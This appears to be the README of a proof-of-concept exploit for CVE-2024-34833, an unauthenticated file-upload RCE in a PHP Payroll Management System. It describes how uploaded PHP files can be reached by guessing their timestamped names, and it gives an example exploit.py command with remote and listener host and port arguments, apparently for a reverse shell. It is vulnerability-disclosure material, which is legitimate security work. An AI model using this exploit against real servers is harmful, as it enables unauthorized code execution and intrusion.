# CVE-2024-34833 Payroll Management System RCE (Unauthenticated) PoC

![](./payroll-cover.jpg)

RCE via file upload for https://www.sourcecodester.com/php/14475/payroll-management-system-using-phpmysql-source-code.html. The filenames have timestamp prepended with a minute accuracy. The script tries to guess the filename using the timestamp of the current, previous and next minute.

## Vulnerability description
Payroll Management System v1.0 allows users to upload images via the "save_settings" page. An unauthenticated attacker can leverage this functionality to upload a malicious PHP file instead. The uploaded files are stored in a publicly accessible folder and have a timestamp with minute precision appended to their filenames, which can be easily calculated. Successful exploitation of this vulnerability results in the ability to execute arbitrary code as the user running the web server.
## Example usage
```commandline
python3 exploit.py -rhost somewebsite.com -rport 443 -lhost 192.168.22.23 -lport 443 -https
```

## Example video
![](./example.gif)
